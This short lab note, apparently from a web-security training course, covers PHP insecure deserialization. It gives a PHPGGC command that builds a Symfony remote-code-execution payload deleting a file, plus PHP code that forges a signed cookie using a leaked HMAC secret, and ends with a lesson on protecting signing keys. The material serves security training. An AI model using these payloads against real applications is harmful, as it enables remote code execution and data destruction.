# PHPGGC and Signed Cookies

## PHPGGC example

```bash
./phpggc Symfony/RCE4 exec 'rm /home/carlos/morale.txt' | base64
```

## Signed-cookie construction from the Academy lab

```php
<?php
$object = "OBJECT-GENERATED-BY-PHPGGC";
$secretKey = "LEAKED-SECRET-KEY-FROM-PHPINFO.PHP";
$cookie = urlencode('{"token":"' . $object . '","sig_hmac_sha1":"' . hash_hmac('sha1', $object, $secretKey) . '"}');
echo $cookie;
```

## Security lesson

A signature can prevent unauthorized modification only when the signing secret is protected.

If the secret is leaked, an attacker may be able to generate valid signatures for malicious serialized objects.
